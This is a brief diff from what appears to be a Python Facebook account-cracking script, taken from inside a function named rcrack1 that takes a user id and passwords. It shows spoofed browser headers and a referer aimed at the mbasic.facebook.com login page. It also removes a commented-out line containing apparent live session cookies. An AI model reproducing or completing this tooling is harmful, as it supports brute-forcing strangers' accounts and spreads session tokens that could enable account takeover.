@@ -237,7 +237,6 @@ def rcrack1(uid,pwx,tl):
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=qSwLZONtLs7FOgyBagK7EtEk; sb=qSwLZK69-ddEoYMmCBiVvtwE; m_pixel_ratio=2; wd=360x800; dnonce=AWlQtfwZRS3AdENdKLS121dbDR-KxDnXK-GC0tNSJ0PkwPlWDugiKGZYKNvYAQSXJXzCMGWbEnoM7TUSTxAZKfTm; fr=0SG4XlpuLrJ2HBCZ7..BkCyyp.NL.AAA.0.0.BkC1Ud.AWW3tyk985A',
     'origin': 'https://mbasic.facebook.com',
     'referer': 'https://mbasic.facebook.com/login/?li=3lQLZG25aSob6IOL_4I1-Ybx&e=1348029&shbl=1&refsrc=deprecated&rtime=1678464224&subno_key=AaEKxYBOnWW4l9EQ0Bq7uKl7Jg1RgNFSk3wpZjfROqXgW2YXilbDg_PgjqKVct65vO0dmasqo4_DCL-GFWeSjZSftpiWd1WT9O7yTwmt2bZXs0uokhQ-PWErD-gvrlHYRc61qGmaHdZlEkPqaPfG3zFBKH1gpBKBKud-lSw6oQg90yuK9ZESkO-qJEeESAP0Q67qv5T_sGGBUKzBqGbS4C807pJnJKgpDoZZn6N8L0_ICZQDKlDb5o6JEgaEnyzUkomav5smQyXPUtcc44KRt8jG33aWuAbeJzIYrIK2GZL3bkBs7VHWp4fB3McwCPPOJVE&hrc=1&_rdr',
     'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
